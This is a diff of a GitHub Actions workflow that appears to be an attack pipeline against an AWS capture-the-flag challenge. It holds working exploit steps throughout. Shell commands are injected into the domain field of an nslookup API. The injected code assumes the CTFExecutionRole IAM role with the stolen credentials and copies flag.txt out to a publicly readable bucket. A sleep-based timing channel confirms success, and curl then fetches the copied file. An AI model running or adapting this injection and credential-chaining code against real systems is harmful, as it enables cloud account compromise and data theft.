@@ -128,23 +128,47 @@ jobs:
             echo "boto3 also failed"
           fi
 
-      - name: EXPLOIT - AssumeRole CTFExecutionRole then read flag
+      - name: PRIVESC ATTEMPT 1 - assume CTFExecutionRole directly from cicdRole
         run: |
-          echo "lambdaRole CAN assume CTFExecutionRole (confirmed by timing). Chaining to read flag."
-          INJECT="x; CREDS=\$(aws sts assume-role --role-arn arn:aws:iam::009661764077:role/CTFExecutionRole --role-session-name pwned --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text); AKI=\$(echo \$CREDS | cut -d' ' -f1); SAK=\$(echo \$CREDS | cut -d' ' -f2); ST=\$(echo \$CREDS | cut -d' ' -f3); AWS_ACCESS_KEY_ID=\$AKI AWS_SECRET_ACCESS_KEY=\$SAK AWS_SESSION_TOKEN=\$ST aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag-exfil-ctf.txt 2>&1 && sleep 15 || sleep 1 #"
+          echo "CTFExecutionRole bucket policy: GetObject+PutObject on codec bucket, NO VPC condition"
+          echo "If cicdRole can assume CTFExecutionRole, we read flag directly from the runner"
+          CREDS=$(aws sts assume-role \
+            --role-arn arn:aws:iam::009661764077:role/CTFExecutionRole \
+            --role-session-name cicd-privesc 2>&1) && echo "ASSUMED: $CREDS" || echo "DENIED: $CREDS"
+          AKI=$(echo "$CREDS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['Credentials']['AccessKeyId'])" 2>/dev/null)
+          if [ -n "$AKI" ]; then
+            SAK=$(echo "$CREDS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['Credentials']['SecretAccessKey'])")
+            ST=$(echo  "$CREDS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['Credentials']['SessionToken'])")
+            echo "--- Reading flag as CTFExecutionRole ---"
+            AWS_ACCESS_KEY_ID=$AKI AWS_SECRET_ACCESS_KEY=$SAK AWS_SESSION_TOKEN=$ST \
+              aws s3 cp s3://codec4f26c862a321ef5/flag.txt -
+          fi
+
+      - name: PRIVESC ATTEMPT 2 - Lambda RCE assume CTFExecutionRole, exfil via Python boto3
+        run: |
+          echo "Bug fix: use Python json to parse tab-separated creds correctly"
+          echo "CTFExecutionRole CAN read flag.txt (no VPC condition). Exfil via update Lambda response."
+          INJECT='x; python3 -c "
+          import subprocess,json,os,sys
+          r=json.loads(subprocess.run([\"aws\",\"sts\",\"assume-role\",\"--role-arn\",\"arn:aws:iam::009661764077:role/CTFExecutionRole\",\"--role-session-name\",\"p\"],capture_output=True,text=True).stdout)
+          c=r[\"Credentials\"]
+          e=dict(os.environ,AWS_ACCESS_KEY_ID=c[\"AccessKeyId\"],AWS_SECRET_ACCESS_KEY=c[\"SecretAccessKey\"],AWS_SESSION_TOKEN=c[\"SessionToken\"],AWS_DEFAULT_REGION=\"us-east-1\")
+          out=subprocess.run([\"aws\",\"s3\",\"cp\",\"s3://codec4f26c862a321ef5/flag.txt\",\"s3://platform-bucket-009661764077-us-east-1/flag-ctfe.txt\"],env=e,capture_output=True,text=True)
+          sys.exit(0 if out.returncode==0 else 1)
+          " && sleep 15 || sleep 1 #'
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
           curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           ELAPSED_MS=$(( (END - START) / 1000000 ))
-          echo "AssumeRole+flag copy timing: ${ELAPSED_MS}ms"
+          echo "Timing: ${ELAPSED_MS}ms"
           if [ $ELAPSED_MS -gt 10000 ]; then
-            echo "FLAG COPIED TO PUBLIC BUCKET!"
-            sleep 3
-            curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/flag-exfil-ctf.txt
+            echo "SUCCESS - flag copied to platform-bucket!"
+            sleep 2
+            curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/flag-ctfe.txt
           else
-            echo "Failed, trying alternate exfil"
+            echo "Failed"
           fi
 
       - name: Privilege escalation - test sts:AssumeRole for CTFExecutionRole
